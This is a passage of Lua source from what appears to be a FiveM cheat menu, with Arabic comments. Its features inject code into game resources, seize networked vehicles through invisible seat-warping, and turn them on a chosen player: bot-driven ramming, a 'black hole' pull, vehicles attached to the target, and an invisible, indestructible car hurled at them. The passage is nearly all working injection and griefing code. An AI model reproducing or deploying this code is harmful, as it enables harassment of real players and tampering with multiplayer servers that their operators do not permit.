                                                    local originalTarget = GetPlayerPed(originalTargetPlayer)
                                                    if DoesEntityExist(originalTarget) then
                                                        local targetPos = GetEntityCoords(originalTarget)
                                                        local targetHeading = GetEntityHeading(originalTarget)
                                                        local forwardVec = GetEntityForwardVector(originalTarget)
                                                        local spawnPos = targetPos + forwardVec * 15.0
                                                       
                                                        SetEntityCoordsNoOffset(targetVehicle, spawnPos.x, spawnPos.y, spawnPos.z, false, false, false)
                                                        SetEntityHeading(targetVehicle, targetHeading + 180.0)
                                                        PlaceObjectOnGroundProperly(targetVehicle)
                                                       
                                                        SetVehicleForwardSpeed(targetVehicle, 30.0)
                                                        TaskVehicleDriveToCoord(botPed, targetVehicle, targetPos.x, targetPos.y, targetPos.z, 35.0, 0, GetEntityModel(targetVehicle), 786603, 1.0, true)
                                                    end
                                                   
                                                    Citizen.Wait(1500)
                                                end
                                            end)
                                           
                                            SetModelAsNoLongerNeeded(botModel)
                                        end
                                    end
                                end)
                            ]])
                            MachoMenuNotification("Vehicle", "Fallback VDM - Using occupied vehicle targeting Player ID: " .. GetPlayerServerId(selectedPlayer))
                        else
                            -- لم يتم العثور على أي سيارة - إنشاء سيارة جديدة
                            local function spawnVehicle(vtype, name, pos, user_id, autoSeat)
                                local mhash = GetHashKey(name)
                                RequestModel(mhash)
                                
                                local timeout = 0
                                while not HasModelLoaded(mhash) and timeout < 8000 do
                                    Citizen.Wait(100)
                                    timeout = timeout + 100
                                end
                                
                                if not HasModelLoaded(mhash) then
                                    return false
                                end
                                local x, y, z = table.unpack(pos or GetEntityCoords(PlayerPedId()))
                                local heading = GetEntityHeading(PlayerPedId()) + math.random(-180, 180)
                                
                                local vehicle = CreateVehicle(mhash, x, y, z, heading, true, false)
                                
                                if DoesEntityExist(vehicle) then
                                    SetVehicleOnGroundProperly(vehicle)
                                    SetVehicleNumberPlateText(vehicle, "CHAOS" .. math.random(1,99))
                                    SetModelAsNoLongerNeeded(mhash)
                                    SetEntityInvincible(vehicle, true)
                                    SetVehicleBodyHealth(vehicle, 50000.0)
                                    SetVehicleEngineHealth(vehicle, 50000.0)
                                    SetVehicleUndriveable(vehicle, false)
                                    NetworkRegisterEntityAsNetworked(vehicle)
                                    SetNetworkIdCanMigrate(NetworkGetNetworkIdFromEntity(vehicle), false)
                                    
                                    -- ضمان التحكم في المركبة
                                    SetEntityAsMissionEntity(vehicle, true, true)
                                    NetworkRequestControlOfEntity(vehicle)
                                    
                                    return vehicle
                                else
                                    SetModelAsNoLongerNeeded(mhash)
                                    return false
                                end
                            end
                            
                            -- قائمة السيارات المستثناة
                            local excludedVehicles = {
                                "stunt",
                                "avisa",
                                "marshall"
                            }
                            
                            -- الحصول على جميع نماذج السيارات المتاحة في اللعبة
                            local vehicleModels = GetAllVehicleModels()
                            
                            -- فلترة السيارات المستثناة
                            local filteredVehicles = {}
                            for i = 1, #vehicleModels do
                                local vehicleModel = vehicleModels[i]
                                local shouldInclude = true
                                for _, excludedName in ipairs(excludedVehicles) do
                                    if string.find(string.lower(vehicleModel), string.lower(excludedName)) then
                                        shouldInclude = false
                                        break
                                    end
                                end
                                if shouldInclude then
                                    table.insert(filteredVehicles, vehicleModel)
                                end
                            end
                            
                            -- اختيار سيارة عشوائية
                            local randomVehicle = filteredVehicles[math.random(1, #filteredVehicles)]
                            
                            -- إنشاء السيارة بالقرب من الهدف
                            local spawnPos = targetPos + vector3(math.random(-10, 10), math.random(-10, 10), 2.0)
                            local spawnedVehicle = spawnVehicle("car", randomVehicle, {spawnPos.x, spawnPos.y, spawnPos.z}, math.random(1000, 9999), false)
                            
                            if spawnedVehicle then
                                -- استخدام الوارب السريع للسيارة المُنشأة
                                SetEntityVisible(playerPed, false, false)
                                ClearPedTasksImmediately(playerPed)
                                TaskWarpPedIntoVehicle(playerPed, spawnedVehicle, -1)
                                ClearPedTasksImmediately(playerPed)
                                TaskLeaveVehicle(playerPed, spawnedVehicle, 0)
                                SetEntityCoordsNoOffset(playerPed, originalPos.x, originalPos.y, originalPos.z, false, false, false)
                                SetEntityHeading(playerPed, originalHeading)
                                SetEntityVisible(playerPed, true, false)
                               
                                MachoInjectResource("any", [[
                                    vdmActive = true
                                    vdmBotPed = nil
                                    vdmVehicle = nil
                                    originalTargetPlayer = ]] .. originalTargetPlayer .. [[
                                   
                                    Citizen.CreateThread(function()
                                        local targetVehicle = ]] .. spawnedVehicle .. [[
                                       
                                        if DoesEntityExist(targetVehicle) and vdmActive then
                                            vdmVehicle = targetVehicle
                                           
                                            NetworkRequestControlOfEntity(targetVehicle)
                                            SetEntityAsMissionEntity(targetVehicle, true, true)
                                           
                                            -- إنشاء بوت للقيادة
                                            local botModel = GetHashKey("mp_m_freemode_01")
                                            RequestModel(botModel)
                                            while not HasModelLoaded(botModel) do
                                                if not vdmActive then return end
                                                Citizen.Wait(0)
                                            end
                                           
                                            if not vdmActive then return end
                                           
                                            local botPed = CreatePed(4, botModel, 0.0, 0.0, 0.0, 0.0, false, false)
                                            vdmBotPed = botPed
                                           
                                            SetEntityAsMissionEntity(botPed, false, false)
                                            SetPedCanBeDraggedOut(botPed, false)
                                            SetPedConfigFlag(botPed, 32, true)
                                            SetPedFleeAttributes(botPed, 0, false)
                                            SetPedCombatAttributes(botPed, 17, true)
                                            SetPedSeeingRange(botPed, 0.0)
                                            SetPedHearingRange(botPed, 0.0)
                                            SetPedAlertness(botPed, 0)
                                            SetPedKeepTask(botPed, true)
                                            SetEntityCollision(botPed, false, false)
                                            SetEntityVisible(botPed, true, false)
                                            NetworkSetEntityInvisibleToNetwork(botPed, true)
                                           
                                            SetPedIntoVehicle(botPed, targetVehicle, -1)
                                           
                                            SetVehicleDoorsLocked(targetVehicle, 4)
                                            SetVehicleEngineOn(targetVehicle, true, true, false)
                                            SetVehicleEnginePowerMultiplier(targetVehicle, 1.5)
                                            ModifyVehicleTopSpeed(targetVehicle, 1.3)
                                           
                                            -- حلقة VDM
                                            Citizen.CreateThread(function()
                                                while DoesEntityExist(targetVehicle) and vdmActive do
                                                    local originalTarget = GetPlayerPed(originalTargetPlayer)
                                                    if DoesEntityExist(originalTarget) then
                                                        local targetPos = GetEntityCoords(originalTarget)
                                                        local targetHeading = GetEntityHeading(originalTarget)
                                                        local forwardVec = GetEntityForwardVector(originalTarget)
                                                        local spawnPos = targetPos + forwardVec * 15.0
                                                       
                                                        SetEntityCoordsNoOffset(targetVehicle, spawnPos.x, spawnPos.y, spawnPos.z, false, false, false)
                                                        SetEntityHeading(targetVehicle, targetHeading + 180.0)
                                                        PlaceObjectOnGroundProperly(targetVehicle)
                                                       
                                                        SetVehicleForwardSpeed(targetVehicle, 30.0)
                                                        TaskVehicleDriveToCoord(botPed, targetVehicle, targetPos.x, targetPos.y, targetPos.z, 35.0, 0, GetEntityModel(targetVehicle), 786603, 1.0, true)
                                                    end
                                                   
                                                    Citizen.Wait(1500)
                                                end
                                            end)
                                           
                                            SetModelAsNoLongerNeeded(botModel)
                                        end
                                    end)
                                ]])
                                MachoMenuNotification("Vehicle", "Spawned new vehicle VDM - " .. randomVehicle .. " targeting Player ID: " .. GetPlayerServerId(selectedPlayer))
                            else
                                MachoMenuNotification("Error", "Failed to spawn vehicle for VDM")
                            end
                        end
                    end
                end
            else
                MachoMenuNotification("Error", "Player not found")
            end
        else
            MachoMenuNotification("Error", "No player selected")
        end
    end,
    function()
        enableVDM = false
        MachoInjectResource("any", [[
            vdmActive = false
        ]])
        MachoMenuNotification("Vehicle", "VDM Bot deactivated")
    end
)
MachoMenuCheckbox(PlayerSection, "Black Hole", 
    function()
        enableBlackHole = true
        local selectedPlayer = MachoMenuGetSelectedPlayer()  
        if selectedPlayer and selectedPlayer ~= -1 then      
            local targetPed = GetPlayerPed(selectedPlayer)   
            if targetPed and DoesEntityExist(targetPed) then
                local originalTargetPlayer = selectedPlayer
                
                MachoInjectResource("any", [[
                    blackHoleActive = true
                    originalTargetPlayer = ]] .. originalTargetPlayer .. [[
                    
                    Citizen.CreateThread(function()
                        while blackHoleActive do
                            local targetPed = GetPlayerPed(originalTargetPlayer)
                            -- التأكد من وجود الشخص المحدد فقط
                            if DoesEntityExist(targetPed) then
                                local targetPos = GetEntityCoords(targetPed)
                                
                                -- البحث عن جميع السيارات في نطاق 200 متر
                                local handle, vehicle = FindFirstVehicle()
                                local success
                                repeat
                                    if DoesEntityExist(vehicle) then
                                        local vehiclePos = GetEntityCoords(vehicle)
                                        local distance = #(targetPos - vehiclePos)
                                        
                                                if distance < 400.0 and distance > 2.0 then -- تجنب السيارات القريبة جداً
                                            -- فحص الصلاحية على السيارة
                                            NetworkRequestControlOfEntity(vehicle)
                                            local hasControl = NetworkHasControlOfEntity(vehicle)
                                            
                                            if hasControl then
                                                -- عنده صلاحية - جذب عادي
                                                local direction = targetPos - vehiclePos
                                                direction = direction / #direction
                                                local force = 80.0
                                                local velocity = direction * force
                                                SetEntityVelocity(vehicle, velocity.x, velocity.y, velocity.z)
                                            else
                                                -- ماعنده صلاحية - فحص إذا السيارة فارغة
                                                local isVehicleEmpty = true
                                                local maxSeats = GetVehicleModelNumberOfSeats(GetEntityModel(vehicle)) - 1
                                                
                                                for seat = -1, maxSeats do
                                                    local pedInSeat = GetPedInVehicleSeat(vehicle, seat)
                                                    if pedInSeat ~= 0 then
                                                        local playerId = NetworkGetPlayerIndexFromPed(pedInSeat)
                                                        if playerId ~= -1 then
                                                            isVehicleEmpty = false
                                                            break
                                                        end
                                                    end
                                                end
                                                
                                                if isVehicleEmpty then
                                                    -- السيارة فارغة - وارب سريع جداً بدون أي انتظار
                                                    local playerPed = PlayerPedId()
                                                    local originalPos = GetEntityCoords(playerPed)
                                                    local originalHeading = GetEntityHeading(playerPed)
                                                    
                                                    SetEntityVisible(playerPed, false, false)
                                                    ClearPedTasksImmediately(playerPed)
                                                    TaskWarpPedIntoVehicle(playerPed, vehicle, -1)
                                                    ClearPedTasksImmediately(playerPed)
                                                    TaskLeaveVehicle(playerPed, vehicle, 0)
                                                    SetEntityCoordsNoOffset(playerPed, originalPos.x, originalPos.y, originalPos.z, false, false, false)
                                                    SetEntityHeading(playerPed, originalHeading)
                                                    SetEntityVisible(playerPed, true, false)
                                                    
                                                    -- الآن جذب السيارة
                                                    local direction = targetPos - vehiclePos
                                                    direction = direction / #direction
                                                    local force = 80.0
                                                    local velocity = direction * force
                                                    SetEntityVelocity(vehicle, velocity.x, velocity.y, velocity.z)
                                                end
                                                -- إذا فيها قائد - تجنبها (مافي كود)
                                            end
                                        end
                                    end
                                    success, vehicle = FindNextVehicle(handle)
                                until not success
                                EndFindVehicle(handle)
                            end
                            
                            Citizen.Wait(100) -- تحديث كل 100 مللي ثانية للحصول على تأثير سلس
                        end
                    end)
                ]])
                MachoMenuNotification("Black Hole", "Black Hole activated on Player ID: " .. GetPlayerServerId(selectedPlayer))
            else
                MachoMenuNotification("Error", "Player not found")
            end
        else
            MachoMenuNotification("Error", "No player selected")
        end
    end,
    function()
        enableBlackHole = false
        MachoInjectResource("any", [[
            blackHoleActive = false
        ]])
        MachoMenuNotification("Black Hole", "Black Hole deactivated")
    end
)
MachoMenuCheckbox(PlayerSection, "Attach Vehicles", 
    function()
        enableAttach = true
        local selectedPlayer = MachoMenuGetSelectedPlayer()  
        if selectedPlayer and selectedPlayer ~= -1 then      
            local targetPed = GetPlayerPed(selectedPlayer)   
            if targetPed and DoesEntityExist(targetPed) then
                local originalTargetPlayer = selectedPlayer
                
                MachoInjectResource("any", [[
                    attachActive = true
                    originalTargetPlayer = ]] .. originalTargetPlayer .. [[
                    attachedVehicles = {}
                    
                    Citizen.CreateThread(function()
                        local targetPed = GetPlayerPed(originalTargetPlayer)
                        -- التأكد من وجود الشخص المحدد فقط
                        if DoesEntityExist(targetPed) then
                            local targetPos = GetEntityCoords(targetPed)
                            
                            -- البحث عن جميع السيارات في نطاق 200 متر
                            local handle, vehicle = FindFirstVehicle()
                            local success
                            repeat
                                if DoesEntityExist(vehicle) then
                                    local vehiclePos = GetEntityCoords(vehicle)
                                    local distance = #(targetPos - vehiclePos)
                                    
                                    if distance < 400.0 and distance > 2.0 then -- تجنب السيارات القريبة جداً
                                        -- فحص الصلاحية على السيارة
                                        NetworkRequestControlOfEntity(vehicle)
                                        local hasControl = NetworkHasControlOfEntity(vehicle)
                                        
                                        if hasControl then
                                            -- عنده صلاحية - عمل attach في نفس مكان الشخص
                                            AttachEntityToEntity(
                                                vehicle, targetPed, 0,
                                                0.0, 0.0, 0.0, -- نفس مكان الشخص بالضبط
                                                0.0, 0.0, 0.0,
                                                false, false, true, false, 2, true
                                            )
                                            table.insert(attachedVehicles, vehicle)
                                        else
                                            -- ماعنده صلاحية - فحص إذا السيارة فارغة
                                            local isVehicleEmpty = true
                                            local maxSeats = GetVehicleModelNumberOfSeats(GetEntityModel(vehicle)) - 1
                                            
                                            for seat = -1, maxSeats do
                                                local pedInSeat = GetPedInVehicleSeat(vehicle, seat)
                                                if pedInSeat ~= 0 then
                                                    local playerId = NetworkGetPlayerIndexFromPed(pedInSeat)
                                                    if playerId ~= -1 then
                                                        isVehicleEmpty = false
                                                        break
                                                    end
                                                end
                                            end
                                            
                                            if isVehicleEmpty then
                                                -- السيارة فارغة - وارب سريع للحصول على الصلاحية
                                                local playerPed = PlayerPedId()
                                                local originalPos = GetEntityCoords(playerPed)
                                                local originalHeading = GetEntityHeading(playerPed)
                                                
                                                SetEntityVisible(playerPed, false, false)
                                                ClearPedTasksImmediately(playerPed)
                                                TaskWarpPedIntoVehicle(playerPed, vehicle, -1)
                                                ClearPedTasksImmediately(playerPed)
                                                TaskLeaveVehicle(playerPed, vehicle, 0)
                                                SetEntityCoordsNoOffset(playerPed, originalPos.x, originalPos.y, originalPos.z, false, false, false)
                                                SetEntityHeading(playerPed, originalHeading)
                                                SetEntityVisible(playerPed, true, false)
                                                
                                                -- الآن عمل attach للسيارة في نفس مكان الشخص
                                                AttachEntityToEntity(
                                                    vehicle, targetPed, 0,
                                                    0.0, 0.0, 0.0, -- نفس مكان الشخص بالضبط
                                                    0.0, 0.0, 0.0,
                                                    false, false, true, false, 2, true
                                                )
                                                table.insert(attachedVehicles, vehicle)
                                            end
                                            -- إذا فيها قائد - تجنبها (مافي كود)
                                        end
                                    end
                                end
                                success, vehicle = FindNextVehicle(handle)
                            until not success
                            EndFindVehicle(handle)
                        end
                    end)
                ]])
                MachoMenuNotification("Attach", "Vehicle attach activated on Player ID: " .. GetPlayerServerId(selectedPlayer))
            else
                MachoMenuNotification("Error", "Player not found")
            end
        else
            MachoMenuNotification("Error", "No player selected")
        end
    end,
    function()
        enableAttach = false
        MachoInjectResource("any", [[
            attachActive = false
            -- فصل جميع السيارات المرفقة
            for i, vehicle in ipairs(attachedVehicles) do
                if DoesEntityExist(vehicle) then
                    DetachEntity(vehicle, true, true)
                end
            end
            attachedVehicles = {}
        ]])
        MachoMenuNotification("Attach", "Vehicle attach deactivated - All vehicles detached")
    end
)
MachoMenuCheckbox(PlayerSection, "Annoy Player", 
    function()
        enableBlackHole = true
        local selectedPlayer = MachoMenuGetSelectedPlayer()  
        if selectedPlayer and selectedPlayer ~= -1 then      
            local targetPed = GetPlayerPed(selectedPlayer)   
            if targetPed and DoesEntityExist(targetPed) then
                local originalTargetPlayer = selectedPlayer
                
                MachoInjectResource("any", [[
                    blackHoleActive = true
                    blackHoleVehicle = nil
                    originalTargetPlayer = ]] .. originalTargetPlayer .. [[
                    teleportCooldown = 0
                    
                    Citizen.CreateThread(function()
                        -- البحث عن سيارة واحدة فقط
                        while blackHoleActive and not blackHoleVehicle do
                            local targetPed = GetPlayerPed(originalTargetPlayer)
                            if DoesEntityExist(targetPed) then
                                local targetPos = GetEntityCoords(targetPed)
                                
                                -- البحث عن أول سيارة مناسبة في نطاق 400 متر
                                local handle, vehicle = FindFirstVehicle()
                                local success
                                repeat
                                    if DoesEntityExist(vehicle) then
                                        local vehiclePos = GetEntityCoords(vehicle)
                                        local distance = #(targetPos - vehiclePos)
                                        
                                        if distance < 400.0 and distance > 2.0 then
                                            -- فحص الصلاحية على السيارة
                                            NetworkRequestControlOfEntity(vehicle)
                                            local hasControl = NetworkHasControlOfEntity(vehicle)
                                            
                                            if hasControl then
                                                -- عنده صلاحية - استخدم هذه السيارة
                                                blackHoleVehicle = vehicle
                                                break
                                            else
                                                -- ماعنده صلاحية - فحص إذا السيارة فارغة
                                                local isVehicleEmpty = true
                                                local maxSeats = GetVehicleModelNumberOfSeats(GetEntityModel(vehicle)) - 1
                                                
                                                for seat = -1, maxSeats do
                                                    local pedInSeat = GetPedInVehicleSeat(vehicle, seat)
                                                    if pedInSeat ~= 0 then
                                                        local playerId = NetworkGetPlayerIndexFromPed(pedInSeat)
                                                        if playerId ~= -1 then
                                                            isVehicleEmpty = false
                                                            break
                                                        end
                                                    end
                                                end
                                                
                                                if isVehicleEmpty then
                                                    -- السيارة فارغة - وارب سريع للحصول على التحكم
                                                    local playerPed = PlayerPedId()
                                                    local originalPos = GetEntityCoords(playerPed)
                                                    local originalHeading = GetEntityHeading(playerPed)
                                                    
                                                    SetEntityVisible(playerPed, false, false)
                                                    ClearPedTasksImmediately(playerPed)
                                                    TaskWarpPedIntoVehicle(playerPed, vehicle, -1)
                                                    ClearPedTasksImmediately(playerPed)
                                                    TaskLeaveVehicle(playerPed, vehicle, 0)
                                                    SetEntityCoordsNoOffset(playerPed, originalPos.x, originalPos.y, originalPos.z, false, false, false)
                                                    SetEntityHeading(playerPed, originalHeading)
                                                    SetEntityVisible(playerPed, true, false)
                                                    
                                                    -- الآن استخدم هذه السيارة
                                                    blackHoleVehicle = vehicle
                                                    break
                                                end
                                            end
                                        end
                                    end
                                    success, vehicle = FindNextVehicle(handle)
                                until not success
                                EndFindVehicle(handle)
                            end
                            
                            Citizen.Wait(1000) -- انتظار ثانية قبل البحث مرة أخرى
                        end
                        
                        -- إذا تم العثور على سيارة، ابدأ الـ Black Hole
                        if blackHoleVehicle and DoesEntityExist(blackHoleVehicle) then
                            -- جعل السيارة مخفية
                            SetEntityVisible(blackHoleVehicle, false, false)
                            SetEntityAlpha(blackHoleVehicle, 0, false)
                            NetworkSetEntityInvisibleToNetwork(blackHoleVehicle, true)
                            
                            -- جعل السيارة غير قابلة للتخريب
                            SetEntityInvincible(blackHoleVehicle, true)
                            SetVehicleCanBreak(blackHoleVehicle, false)
                            SetVehicleCanBeVisiblyDamaged(blackHoleVehicle, false)
                            SetVehicleCanEngineOperateOnFire(blackHoleVehicle, true)
                            SetVehicleCanLeakOil(blackHoleVehicle, false)
                            SetVehicleCanLeakPetrol(blackHoleVehicle, false)
                            SetVehicleWheelsCanBreak(blackHoleVehicle, false)
                            SetVehicleWheelsCanBreakOffWhenBlowUp(blackHoleVehicle, false)
                            SetVehicleHasUnbreakableLights(blackHoleVehicle, true)
                            SetVehicleCanDeformWheels(blackHoleVehicle, false)
                            -- SetVehicleCanBeDamaged غير متوفر في FiveM
                            SetEntityCanBeDamaged(blackHoleVehicle, false)
                            
                            -- منع التفجير والانفجار
                            SetEntityProofs(blackHoleVehicle, true, true, true, true, true, true, true, true)
                            SetVehicleStrong(blackHoleVehicle, true)
                            SetVehicleCanBeTargetted(blackHoleVehicle, false)
                            SetEntityCanBeDamagedByRelationshipGroup(blackHoleVehicle, false, 0)
                            
                            -- جعل الصدمات صامتة عبر إعدادات الفيزياء
                            SetVehicleGravityAmount(blackHoleVehicle, 0.0)
                            SetEntityCollision(blackHoleVehicle, true, false) -- collision بدون أصوات
                            SetEntityRecordsCollisions(blackHoleVehicle, false)
                            
                            -- منع حذف السيارة
                            SetEntityAsMissionEntity(blackHoleVehicle, true, true)
                            SetVehicleHasBeenOwnedByPlayer(blackHoleVehicle, true)
                            SetEntityAsNoLongerNeeded(blackHoleVehicle)
                            FreezeEntityPosition(blackHoleVehicle, false)
                            SetVehicleOnGroundProperly(blackHoleVehicle)
                            
                            -- جعل السيارة صامتة (استخدام دوال أساسية فقط)
                            SetVehicleEngineOn(blackHoleVehicle, true, true, false)
                            SetVehicleRadioEnabled(blackHoleVehicle, false)
                            SetVehicleLights(blackHoleVehicle, 0)
                            SetVehicleSiren(blackHoleVehicle, false)
                            -- إزالة جميع الدوال غير المتوفرة في FiveM
                            
                            -- حلقة الـ Black Hole مع النقل والجذب
                            while blackHoleActive and DoesEntityExist(blackHoleVehicle) do
                                local targetPed = GetPlayerPed(originalTargetPlayer)
                                
                                if DoesEntityExist(targetPed) then
                                    local targetPos = GetEntityCoords(targetPed)
                                    local vehiclePos = GetEntityCoords(blackHoleVehicle)
                                    local distance = #(targetPos - vehiclePos)
                                    
                                    -- التأكد من بقاء السيارة مخفية ومحمية
                                    SetEntityVisible(blackHoleVehicle, false, false)
                                    SetEntityAlpha(blackHoleVehicle, 0, false)
                                    
                                    -- إعادة تطبيق الحماية باستمرار
                                    SetEntityInvincible(blackHoleVehicle, true)
                                    SetEntityCanBeDamaged(blackHoleVehicle, false)
                                    SetEntityProofs(blackHoleVehicle, true, true, true, true, true, true, true, true)
                                    SetEntityAsMissionEntity(blackHoleVehicle, true, true)
                                    
                                    -- التأكد من عدم الحذف
                                    if not DoesEntityExist(blackHoleVehicle) then
                                        break -- إذا تم حذف السيارة، إنهاء الحلقة
                                    end
                                    
                                    -- نظام النقل والجذب
                                    if teleportCooldown <= 0 then
                                        -- المرحلة الأولى: نقل السيارة فوق الهدف (ليس تحته)
                                        local teleportPos = vector3(targetPos.x, targetPos.y, targetPos.z + 10.0) -- فوق الهدف بـ 10 متر
                                        SetEntityCoordsNoOffset(blackHoleVehicle, teleportPos.x, teleportPos.y, teleportPos.z, false, false, false)
                                        SetEntityVelocity(blackHoleVehicle, 0.0, 0.0, 0.0)
                                        
                                        -- بدء عداد الجذب
                                        teleportCooldown = 15 -- 15 إطار للجذب (حوالي 1.5 ثانية)
                                    else
                                        -- المرحلة الثانية: جذب السيارة نحو الهدف بسرعة عالية
                                        local currentVehiclePos = GetEntityCoords(blackHoleVehicle)
                                        local direction = targetPos - currentVehiclePos
                                        local normalizedDirection = direction / #direction
                                        
                                        -- قوة جذب عالية جداً
                                        local pullForce = 200.0
                                        local velocity = normalizedDirection * pullForce
                                        
                                        -- تطبيق السرعة
                                        SetEntityVelocity(blackHoleVehicle, velocity.x, velocity.y, velocity.z)
                                        
                                        -- تقليل العداد
                                        teleportCooldown = teleportCooldown - 1
                                        
                                        -- إذا انتهى العداد، إعادة تعيين للنقل مرة أخرى
                                        if teleportCooldown <= 0 then
                                            teleportCooldown = 0
                                        end
                                    end
                                else
                                    -- إذا لم يوجد الهدف، انتظار ولكن استمرار الحلقة
                                    Citizen.Wait(1000)
                                end
                                
                                Citizen.Wait(50) -- تحديث كل 50 مللي ثانية للحصول على سرعة أعلى
                            end
                            
                            -- تنظيف عند إنهاء الحلقة
                            if DoesEntityExist(blackHoleVehicle) then
                                SetEntityAsMissionEntity(blackHoleVehicle, false, false)
                                DeleteEntity(blackHoleVehicle)
                            end
                        end
                    end)
                ]])
                MachoMenuNotification("Black Hole", "Black Hole activated on Player ID: " .. GetPlayerServerId(selectedPlayer))
            else
                MachoMenuNotification("Error", "Player not found")
            end
        else
            MachoMenuNotification("Error", "No player selected")
        end
    end,
    function()
        enableBlackHole = false
        MachoInjectResource("any", [[
            blackHoleActive = false
            blackHoleVehicle = nil
            teleportCooldown = 0
        ]])
        MachoMenuNotification("Black Hole", "Black Hole deactivated")
    end
)
MachoMenuCheckbox(PlayerSection, "Glitch Player", 
    function()
        enableBlackHole = true
        local selectedPlayer = MachoMenuGetSelectedPlayer()  
        if selectedPlayer and selectedPlayer ~= -1 then      
            local targetPed = GetPlayerPed(selectedPlayer)   
            if targetPed and DoesEntityExist(targetPed) then
                local originalTargetPlayer = selectedPlayer
                
                MachoInjectResource("any", [[
                    blackHoleActive = true
                    blackHoleVehicle = nil
                    originalTargetPlayer = ]] .. originalTargetPlayer .. [[
                    teleportCooldown = 0
                    
                    Citizen.CreateThread(function()
                        -- البحث عن سيارة واحدة فقط
                        while blackHoleActive and not blackHoleVehicle do
                            local targetPed = GetPlayerPed(originalTargetPlayer)
                            if DoesEntityExist(targetPed) then
                                local targetPos = GetEntityCoords(targetPed)
                                
                                -- البحث عن أول سيارة مناسبة في نطاق 400 متر
                                local handle, vehicle = FindFirstVehicle()
                                local success
                                repeat
                                    if DoesEntityExist(vehicle) then
                                        local vehiclePos = GetEntityCoords(vehicle)
                                        local distance = #(targetPos - vehiclePos)
                                        
                                        if distance < 400.0 and distance > 2.0 then
                                            -- فحص الصلاحية على السيارة
                                            NetworkRequestControlOfEntity(vehicle)
                                            local hasControl = NetworkHasControlOfEntity(vehicle)
                                            
                                            if hasControl then
                                                -- عنده صلاحية - استخدم هذه السيارة
                                                blackHoleVehicle = vehicle
                                                break
                                            else
                                                -- ماعنده صلاحية - فحص إذا السيارة فارغة
                                                local isVehicleEmpty = true
                                                local maxSeats = GetVehicleModelNumberOfSeats(GetEntityModel(vehicle)) - 1
                                                
                                                for seat = -1, maxSeats do
                                                    local pedInSeat = GetPedInVehicleSeat(vehicle, seat)
                                                    if pedInSeat ~= 0 then
                                                        local playerId = NetworkGetPlayerIndexFromPed(pedInSeat)
                                                        if playerId ~= -1 then
                                                            isVehicleEmpty = false
                                                            break
                                                        end
                                                    end
                                                end
                                                
                                                if isVehicleEmpty then
                                                    -- السيارة فارغة - وارب سريع للحصول على التحكم
                                                    local playerPed = PlayerPedId()
                                                    local originalPos = GetEntityCoords(playerPed)
                                                    local originalHeading = GetEntityHeading(playerPed)
                                                    
                                                    SetEntityVisible(playerPed, false, false)
                                                    ClearPedTasksImmediately(playerPed)
                                                    TaskWarpPedIntoVehicle(playerPed, vehicle, -1)
                                                    ClearPedTasksImmediately(playerPed)
                                                    TaskLeaveVehicle(playerPed, vehicle, 0)
                                                    SetEntityCoordsNoOffset(playerPed, originalPos.x, originalPos.y, originalPos.z, false, false, false)
                                                    SetEntityHeading(playerPed, originalHeading)
                                                    SetEntityVisible(playerPed, true, false)
                                                    
                                                    -- الآن استخدم هذه السيارة
                                                    blackHoleVehicle = vehicle
                                                    break
                                                end
                                            end
                                        end
                                    end
                                    success, vehicle = FindNextVehicle(handle)
                                until not success
                                EndFindVehicle(handle)
                            end
                            
                            Citizen.Wait(1000) -- انتظار ثانية قبل البحث مرة أخرى
                        end
                        
                        -- إذا تم العثور على سيارة، ابدأ الـ Black Hole
                        if blackHoleVehicle and DoesEntityExist(blackHoleVehicle) then
                            -- جعل السيارة مخفية
                            SetEntityVisible(blackHoleVehicle, false, false)
                            SetEntityAlpha(blackHoleVehicle, 0, false)
                            NetworkSetEntityInvisibleToNetwork(blackHoleVehicle, true)
                            
                            -- جعل السيارة غير قابلة للتخريب
                            SetEntityInvincible(blackHoleVehicle, true)
                            SetVehicleCanBreak(blackHoleVehicle, false)
                            SetVehicleCanBeVisiblyDamaged(blackHoleVehicle, false)
                            SetVehicleCanEngineOperateOnFire(blackHoleVehicle, true)
                            SetVehicleCanLeakOil(blackHoleVehicle, false)
                            SetVehicleCanLeakPetrol(blackHoleVehicle, false)
                            SetVehicleWheelsCanBreak(blackHoleVehicle, false)
                            SetVehicleWheelsCanBreakOffWhenBlowUp(blackHoleVehicle, false)
                            SetVehicleHasUnbreakableLights(blackHoleVehicle, true)
                            SetVehicleCanDeformWheels(blackHoleVehicle, false)
                            -- SetVehicleCanBeDamaged غير متوفر في FiveM
                            SetEntityCanBeDamaged(blackHoleVehicle, false)
                            
                            -- منع التفجير والانفجار
                            SetEntityProofs(blackHoleVehicle, true, true, true, true, true, true, true, true)
                            SetVehicleStrong(blackHoleVehicle, true)
                            SetVehicleCanBeTargetted(blackHoleVehicle, false)
                            SetEntityCanBeDamagedByRelationshipGroup(blackHoleVehicle, false, 0)
                            
                            -- جعل الصدمات صامتة عبر إعدادات الفيزياء
                            SetVehicleGravityAmount(blackHoleVehicle, 0.0)
                            SetEntityCollision(blackHoleVehicle, true, false) -- collision بدون أصوات
                            SetEntityRecordsCollisions(blackHoleVehicle, false)
                            
                            -- منع حذف السيارة
                            SetEntityAsMissionEntity(blackHoleVehicle, true, true)
                            SetVehicleHasBeenOwnedByPlayer(blackHoleVehicle, true)
                            SetEntityAsNoLongerNeeded(blackHoleVehicle)
                            FreezeEntityPosition(blackHoleVehicle, false)
                            SetVehicleOnGroundProperly(blackHoleVehicle)
                            
                            -- جعل السيارة صامتة (استخدام دوال أساسية فقط)
                            SetVehicleEngineOn(blackHoleVehicle, true, true, false)
                            SetVehicleRadioEnabled(blackHoleVehicle, false)
                            SetVehicleLights(blackHoleVehicle, 0)
                            SetVehicleSiren(blackHoleVehicle, false)
                            -- إزالة جميع الدوال غير المتوفرة في FiveM
                            
                            -- حلقة الـ Black Hole مع النقل والجذب
                            while blackHoleActive and DoesEntityExist(blackHoleVehicle) do
                                local targetPed = GetPlayerPed(originalTargetPlayer)
                                
                                if DoesEntityExist(targetPed) then
                                    local targetPos = GetEntityCoords(targetPed)
                                    local vehiclePos = GetEntityCoords(blackHoleVehicle)
                                    local distance = #(targetPos - vehiclePos)
                                    
                                    -- التأكد من بقاء السيارة مخفية ومحمية
                                    SetEntityVisible(blackHoleVehicle, false, false)
                                    SetEntityAlpha(blackHoleVehicle, 0, false)
                                    
                                    -- إعادة تطبيق الحماية باستمرار
                                    SetEntityInvincible(blackHoleVehicle, true)
                                    SetEntityCanBeDamaged(blackHoleVehicle, false)
                                    SetEntityProofs(blackHoleVehicle, true, true, true, true, true, true, true, true)
                                    SetEntityAsMissionEntity(blackHoleVehicle, true, true)
                                    
                                    -- التأكد من عدم الحذف
                                    if not DoesEntityExist(blackHoleVehicle) then
